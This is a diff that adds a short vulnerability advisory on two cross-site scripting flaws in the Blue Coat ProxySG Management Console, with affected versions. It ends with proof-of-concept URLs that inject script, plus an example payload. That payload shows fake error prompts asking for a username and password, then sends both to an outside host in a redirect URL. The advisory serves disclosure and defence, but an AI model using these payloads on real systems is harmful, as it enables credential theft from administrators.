@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/26286/info
+
+Blue Coat ProxySG Management Console is prone to two cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Versions prior to ProxySG 4.2.6.1 and 5.2.2.5 are vulnerable.
+
+NOTE: This BID originally covered one issue, but was updated to also cover a second issue. 
+
+https://www.example.com:8082/Secure/Local/console/install_upload_action/crl_format?name="<script>alert("XSS")</script>%00 https://www.example.com:8082/Secure/Local/console/install_upload_from_file.htm?file=<script>alert("XSS")</script><!-- Example Payload: <script> do { a=prompt("Blue Coat SG400: an error has occurred\nPlease enter your USERNAME",""); b=prompt("Blue Coat SG400: an error has occurred\nPlease enter your PASSWORD",""); }while(a==null || b==null || a=="" || b==""); alert("owned!:"+a+"/"+b);window.location="http://www.example2.com/?u="+a+"&p="+b </script><!-- 
